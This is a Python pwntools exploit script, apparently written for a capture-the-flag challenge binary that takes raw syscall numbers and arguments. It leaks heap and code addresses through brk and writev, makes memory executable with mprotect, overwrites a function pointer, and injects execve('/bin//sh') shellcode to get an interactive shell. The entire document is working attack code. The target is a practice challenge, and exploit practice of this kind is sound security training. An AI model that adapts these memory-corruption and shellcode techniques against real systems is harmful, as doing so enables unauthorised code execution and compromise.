from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = ''
PORT = 0

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

r = start()
if args.D:
    debug(r, [0x12c4])

def loop(rax, rdi=0, rsi=0, rdx=0):
    r.sendlineafter('syscall: ', str(rax))
    r.sendlineafter('arg1: ', str(rdi))
    r.sendlineafter('arg2: ', str(rsi))
    r.sendlineafter('arg3: ', str(rdx))

# brk(0) for heap leak
loop(12, 0) 
r.recvuntil('retval: ')
leak = int(r.recvuntil('\n')[:-1], 16)
heap = leak - 0x21000
dbg("heap")

# writev(heap+0x11e70) for leak code section
loop(20, 1, heap + 0x11e70, 1) 
r.recvuntil('=\n')
leak = u64(r.recv(8))
code = leak - 0x1114
dbg("code")

# mprotect code section -> rw
loop(10, code+0x202000, 0x1000, 7)

# mprotect heap section -> rwx
loop(10, heap+0x11000, 0x1000, 7)

# readv  function pointer -> param rdx
loop(19, 0, heap + 0x11e70, 0x1)
payload = ''
payload += flat(code+0x1114, heap+0x11e90)
r.send(payload)

# read  heap+0x11f00 -> shellcode
loop(0, 0, heap + 0x11f00, 0xc3c03148)
r.send(_64_SHELLCODE)

# read  code + 0x202ce8(check) -> heap + 0x11f00
loop(0, 0, code + 0x202ce8, 0xc3c03148)
payload = ''
payload += flat(heap+0x11f00)
r.send(payload)

# fire
loop(1, 2, 3, 4)

r.interactive()
r.close()
